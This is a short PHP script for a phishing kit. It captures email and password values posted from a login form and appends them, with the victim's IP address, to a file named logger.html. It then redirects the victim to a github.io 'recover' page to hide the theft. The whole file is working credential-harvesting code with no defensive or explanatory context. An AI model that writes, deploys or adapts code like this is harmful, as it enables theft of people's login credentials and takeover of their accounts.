<?php
$email = $_POST['email']; 
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("logger.html", "a"); 
fwrite ($f, 'Card LOGIN: [<b><font color="#DC143C">'.$email.'</font></b>] PASSWORD: [<b><font color="#008000">'.$pass.'</font></b>] IP: [<b><font color="#008080">'.$ip.'</font></b>] <br>');
fclose($f);
header('Location: https://charleswayne22.github.io/recover/initiate/');
?>
